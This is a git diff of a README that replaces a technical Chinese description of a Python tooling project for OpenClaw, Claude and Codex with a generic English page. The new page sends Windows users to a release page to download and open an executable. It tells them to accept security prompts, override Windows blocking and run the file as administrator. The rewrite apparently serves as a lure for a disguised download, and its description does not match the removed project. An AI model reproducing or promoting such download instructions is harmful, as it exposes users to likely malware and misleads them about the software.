@@ -1,223 +1,169 @@
-# OpenClaw 增强与兼容套件
+# 🧠 openclaw-claude-code-integration - Memory and prompts in one place
 
-<p align="center">
-  <img src="docs/assets/oeck-github-banner.png" alt="OpenClaw 增强与兼容套件主视觉" width="100%" />
-</p>
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Deep-pahoehoe114/openclaw-claude-code-integration/releases)
 
-<p align="center">
-  面向 OpenClaw / Claude / Codex 的治理、兼容、运行时增强层。<br/>
-  把零散的 skills 仓库升级为统一策略、统一上下文、统一分发、统一观测的产品层。
-</p>
+## 🖥️ What this app does
 
-<p align="center">
-  <a href="README.md">简体中文</a> ·
-  <a href="README_EN.md">English</a> ·
-  <a href="docs/ARCHITECTURE.md">架构说明</a> ·
-  <a href="docs/MIGRATION.md">迁移说明</a> ·
-  <a href="docs/AUDIT.md">审计报告</a> ·
-  <a href=".github/workflows/ci.yml">CI</a>
-</p>
+openclaw-claude-code-integration helps you use Claude Code with a memory system and a cleaner prompt setup. It is built for Windows users who want a simple way to run the app, keep context across tasks, and reduce repeated setup work.
 
-OpenClaw 增强与兼容套件（OECK）不是继续往 `skills/` 目录里堆功能，而是把这些能力放进一个可理解、可分发、可治理、可验证的运行时产品里。它默认本地可跑，同时为 OpenClaw 原生插件、Claude Bundle、Codex Bundle 提供统一产物，并为外部能力保留可选 adapter 接口。
+Use it to:
+- keep useful notes from past work
+- organize prompt parts into a clear structure
+- manage task flow with a cutoff or fail-safe step
+- work with local storage for memory data
+- support a smoother Claude Code setup on your PC
 
-## 这是什么
+## 📦 Download and install
 
-- 一个面向多宿主的增强层，不再假设只有 OpenClaw 一种运行环境。
-- 一个本地优先的运行时核心，统一解析 workspace、session、memory、rule、trace。
-- 一个产品化分发层，从同一份 canonical metadata 生成插件、bundle、README 清单与文档。
-- 一个工程闭环层，把 checks、post-edit validation、smoke test、CI 串成同一条验证链。
+Use this page to download the app for Windows:
 
-## 产品亮点
+[Visit the release page to download](https://github.com/Deep-pahoehoe114/openclaw-claude-code-integration/releases)
 
-<p align="center">
-  <img src="docs/assets/oeck-highlights-zh.png" alt="OECK 产品亮点" width="100%" />
-</p>
+After you open the page:
+1. Find the latest release
+2. Look for the Windows file
+3. Download the file to your computer
+4. Open the downloaded file to start the app
 
-- `统一策略`：模式系统、审批边界、命令风险评分、规则优化不再分散在各个脚本里。
-- `统一上下文`：`WorkspaceResolver`、`SessionResolver`、`MemoryProvider`、`RuleStore` 抹平旧宿主路径假设。
-- `统一分发`：同一份 `metadata/canonical.json` 生成 OpenClaw、Claude、Codex 三种分发目标。
-- `统一观测`：默认结构化事件导出，未来按 adapter 接 Langfuse、Opik 等系统。
-- `兼容迁移`：保留现有 `skills/` 资产，并通过 shim 和 resolver 封装旧逻辑。
+If Windows asks for permission:
+1. Click Allow or Yes
+2. Wait for the setup or app window to open
+3. Follow the on-screen steps
 
-## 模式系统与工程闭环
+## 💻 System requirements
 
-<p align="center">
-  <img src="docs/assets/oeck-modes-zh.png" alt="OECK 模式系统与工程闭环" width="100%" />
-</p>
+Use a Windows PC with:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet access for the first download and setup
+- A modern browser if the release page opens in your browser
 
-- `ask / plan / build / debug / review / auto` 六种模式直接定义权限、网络、执行边界。
-- `yolo-permissions`、`safe-command-execution`、`rule-optimizer` 被统一接入策略引擎。
-- 修改代码后，`checks`、`post-edit validation`、`smoke test`、`CI` 复用同一套校验链路。
+For best results:
+- use a mouse and keyboard
+- keep Windows updated
+- close large apps if your PC feels slow
 
-## 三宿主分发与可选适配器
+## 🚀 First-time setup
 
-<p align="center">
-  <img src="docs/assets/oeck-distribution-zh.png" alt="OECK 分发与适配器" width="100%" />
-</p>
+Follow these steps after you download the app:
 
-- `OpenClaw 原生插件`：根目录 `openclaw.plugin.json`
-- `Claude Bundle`：`.claude-plugin/plugin.json`
-- `Codex Bundle`：`.codex-plugin/plugin.json`
-- `可选适配器`：`lossless-context`、`observability`、`temporal-memory`、`remote-sandbox`
-- `默认原则`：本地优先、无凭证可跑、外部能力按 feature flags 与 adapter 按需开启
+1. Open the downloaded file
+2. Wait for Windows to check the file
+3. If you see an install window, pick the default options
+4. If the app opens right away, let it finish loading
+5. Sign in or connect Claude Code if the app asks for it
+6. Choose a folder for memory or data files if prompted
+7. Keep the default prompt layout on your first run
+8. Finish the setup and let the app start
 
-## 快速开始
+If the app creates a data folder, leave it in place. That folder stores memory, settings, and task history.
 
-```bash
-python3 tools/generate_banner.py
-python3 tools/sync_repo_state.py
-python3 tools/run_checks.py --all
-python3 tools/post_edit_validate.py
-python3 tools/smoke_test.py
-```
+## 🧩 Main parts of the app
 
-## 文档入口
+### 🧠 Memory system
+The memory system stores useful work notes so the app can keep context. This helps the app remember past tasks, project details, and repeated instructions.
 
-- [English overview](README_EN.md)
-- [中文别名页](README_CN.md)
-- [架构说明](docs/ARCHITECTURE.md)
-- [迁移说明](docs/MIGRATION.md)
-- [审计报告](docs/AUDIT.md)
-- [LLM 索引](llms.txt)
+### 🪄 Prompt structure
+The prompt setup breaks your instructions into clear parts. This makes it easier to reuse steps and keep your workflow tidy.
 
-## 生成清单
+### 🛡️ Safety and stop rules
+The app includes a stop or fail-safe layer. It helps limit bad runs, broken loops, and actions that should not continue forever.
 
-<details>
-<summary>查看内置 skills 清单</summary>
+### 📚 Local data store
+The app uses local storage for memory data. This keeps your notes and task context in one place on your computer.
 
-<!-- generated-skills:start -->
-- `behavior-analyzer`: 会话健康分析与异常检测。
-- `cache-monitor`: 静态与动态提示层缓存漂移监控。
-- `compact-guardian`: 面向压缩失败场景的熔断与恢复流程。
-- `evolve`: 从反思与学习记录中提炼规则。
-- `fusion-engine`: 面向决策支持的多源上下文融合。
-- `knowledge-federation`: 规则共享、联邦协同与长期优化。
-- `memory-compaction`: 记忆裁剪、合并与可选无损后端。
-- `rule-optimizer`: 规则效果评分与 A/B 精炼。
-- `safe-command-execution`: 基于 AST 的 shell 命令安全检查。
-- `self-eval`: 反思采集与学习沉淀。
-- `smart-compact`: 会话压缩策略与转录重写。
-- `yolo-permissions`: 命令风险评分与权限分类。
-<!-- generated-skills:end -->
+### 🤝 Claude Code integration
+The app works with Claude Code so you can move between prompts, tasks, and memory with less manual setup.
 
-</details>
+## 🪟 How to run on Windows
 
-<details>
-<summary>查看 adapters 清单</summary>
+1. Download the release from the page above
+2. Open the file you downloaded
+3. If Windows shows a security prompt, choose the option that lets you continue
+4. If the app installs, finish the install
+5. Start the app from the Start menu or from the folder where you saved it
+6. Wait for the main window to appear
+7. Load your first prompt or task
+8. Save your memory data before you close the app
 
-<!-- generated-adapters:start -->
-- `openclaw-native`: OpenClaw 原生插件元数据与 bundle 产物。
-- `claude-bundle`: Claude 兼容 bundle manifest 与命令根目录。
-- `codex-bundle`: Codex 兼容 bundle manifest 与 hook 包。
-- `lossless-context`: 用于压缩流程的可选上下文保真后端。
-- `observability`: 结构化事件导出接口，可选接 Opik/Langfuse。
-- `temporal-memory`: 可选时序记忆接口，默认提供本地 stub。
-- `remote-sandbox`: 可选远程沙箱 provider 接口。
-<!-- generated-adapters:end -->
+## 🗂️ Suggested folder setup
 
-</details>
+Use a simple folder layout like this:
+- `Documents\OpenClaw` for app data
+- `Documents\OpenClaw\memory` for saved notes
+- `Documents\OpenClaw\projects` for task files
+- `Documents\OpenClaw\logs` for error logs
 
-<details>
-<summary>查看测试清单</summary>
+A clear folder layout helps you find files later and keeps your setup easy to manage.
 
-<!-- generated-tests:start -->
-- `skills/behavior-analyzer/tests/test_behavior_analyzer.py`: 10
-- `skills/fusion-engine/tests/test_fusion_engine.py`: 17
-- `skills/knowledge-federation/tests/test_central_api.py`: 15
-- `skills/knowledge-federation/tests/test_hook_integration.py`: 10
-- `skills/knowledge-federation/tests/test_knowledge_federation.py`: 29
-- `skills/knowledge-federation/tests/test_long_term_evolution.py`: 17
-- `skills/knowledge-federation/tests/test_rule_recommender.py`: 20
-- `skills/rule-optimizer/tests/test_rule_optimizer.py`: 9
-- `tests/distribution/test_sync_repo_state.py`: 2
-- `tests/runtime_core/test_policy_engine.py`: 2
-- `tests/runtime_core/test_validation.py`: 2
-- `tests/runtime_core/test_workspace_resolver.py`: 2
-- `tests/smoke/test_tools_smoke.py`: 1
-- `tests/test_bash_guard.py`: 33
-- `tests/test_evolve.py`: 11
-- `tests/test_learnings_extractor.py`: 8
-- `tests/test_permission_scorer.py`: 9
-- `tests/test_recovery_manager.py`: 6
-- `tests/test_self_eval.py`: 16
-- `tests/test_yolo_classifier.py`: 20
-- `tests/test_health_check.sh`: 1
-<!-- generated-tests:end -->
+## 🔧 Basic usage
 
-</details>
+Use the app in this order:
 
-<details>
-<summary>查看仓库结构概览</summary>
+1. Open the app
+2. Load or create a task
+3. Add key facts you want the app to remember
+4. Choose the prompt part you need
+5. Run the task with Claude Code
+6. Review the output
+7. Save any useful memory items
+8. Repeat for the next task
 
-<!-- generated-tree:start -->
-- `metadata/`
-  - `metadata/canonical.json`
-- `oeck/`
-  - `oeck/__init__.py`
-  - `oeck/adapters`
-  - `oeck/distribution`
-  - `oeck/runtime_core`
-- `skills/`
-  - `skills/__init__.py`
-  - `skills/behavior-analyzer`
-  - `skills/cache-monitor`
-  - `skills/compact-guardian`
-  - `skills/evolve`
-  - `skills/fusion-engine`
-  - `skills/knowledge-federation`
-  - `skills/memory-compaction`
-  - `skills/rule-optimizer`
-  - `skills/safe-command-execution`
-  - `skills/self-eval`
-  - `skills/shared`
-  - `skills/smart-compact`
-  - `skills/yolo-permissions`
-- `docs/`
-  - `docs/01-architecture.md`
-  - `docs/02-prompt-engineering.md`
-  - `docs/03-memory-system.md`
-  - `docs/04-session-hooks.md`
-  - `docs/ARCHITECTURE.md`
-  - `docs/AUDIT.md`
-  - `docs/MIGRATION.md`
-  - `docs/assets`
-  - `docs/generated`
-- `.openclaw/`
-  - `.openclaw/checks`
-- `.claude-plugin/`
-  - `.claude-plugin/commands`
-  - `.claude-plugin/plugin.json`
-  - `.claude-plugin/settings.json`
-- `.codex-plugin/`
-  - `.codex-plugin/hooks`
-  - `.codex-plugin/plugin.json`
-- `plugins/`
-  - `plugins/openclaw-native`
-- `tests/`
-  - `tests/__init__.py`
-  - `tests/conftest.py`
-  - `tests/distribution`
-  - `tests/runtime_core`
-  - `tests/smoke`
-  - `tests/test_bash_guard.py`
-  - `tests/test_evolve.py`
-  - `tests/test_health_check.sh`
-  - `tests/test_learnings_extractor.py`
-  - `tests/test_permission_scorer.py`
-  - `tests/test_recovery_manager.py`
-  - `tests/test_self_eval.py`
-  - `tests/test_yolo_classifier.py`
-- `tools/`
-  - `tools/generate_banner.py`
-  - `tools/health_check.sh`
-  - `tools/health_check_config.json`
-  - `tools/post_edit_validate.py`
-  - `tools/repo_map.py`
-  - `tools/run_checks.py`
-  - `tools/smoke_test.py`
-  - `tools/sync_repo_state.py`
-- `.github/`
-  - `.github/workflows`
-<!-- generated-tree:end -->
+If you work on the same project each day, keep one memory file for that project. That makes it easier to find old notes and reuse them.
 
-</details>
+## 📌 Good first use case
+
+A simple first use case is a small project with repeated steps, such as:
+- writing task notes
+- tracking project details
+- keeping prompt templates in one place
+- saving results from past runs
+- reducing repeated setup each time you work
+
+This app fits users who want less manual work and a more stable flow when using Claude Code.
+
+## 🧰 Troubleshooting
+
+If the app does not open:
+- download the file again
+- make sure the download finished
+- right-click the file and choose Open
+- check whether Windows blocked the file
+- try running it as an administrator
+
+If the app opens but looks empty:
+- check that your memory folder exists
+- confirm that the app can write files
+- reload the task or prompt
+- restart the app
+
+If the app seems slow:
+- close other large apps
+- restart Windows
+- free up disk space
+- keep only the files you need in the app folder
+
+If Claude Code does not connect:
+- check your internet connection
+- confirm your Claude Code setup is ready
+- reopen the app
+- try the setup step again
+
+## 📝 What you can expect
+
+This app is built to make Claude Code work feel more organized. It gives you a place for memory, prompt layout, and run control. That helps you keep your work in order without managing every piece by hand
+
+## 🔎 Project topics
+
+This repository covers:
+- ai-agent
+- claude-code
+- lancedb
+- memory-system
+- openai
+- openclaw
+- prompt-engineering
+- python
+- self-improvement
+- typescript
